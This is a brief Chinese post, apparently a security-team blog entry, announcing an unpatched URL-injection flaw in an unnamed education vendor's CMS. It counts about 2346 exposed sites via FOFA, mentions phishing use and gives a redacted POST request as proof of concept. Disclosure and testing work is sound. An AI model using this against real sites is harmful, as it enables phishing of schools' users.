#  某edu供应商cms存在URL注入（通杀0day）   
 TtTeam   2024-11-02 16:22  
  
某edu供应商cms存在URL注入（通杀0day），fofa语法资产约有2346条  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1J2QBmuTCXdiaVibksH9ZU6sPY6t28DVguGeSH6MsCQ3pIcqceMWriclMQJSJ4Gb19tov2EWaMpzBtA/640?wx_fmt=png&from=appmsg "")  
  
任意URL注入，嵌入恶意链接可利用钓鱼攻击  
  
POC:  
  
```
POST /xxx HTTP/2
Host: xxx

u=url&key=&id=8
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV1J2QBmuTCXdiaVibksH9ZU6sX6nuDL1Rj1ibA7sIwZgqz8Zp07nttPJmDBMw9A19tAe4TEVpWh1wopw/640?wx_fmt=png&from=appmsg "")  
  
  
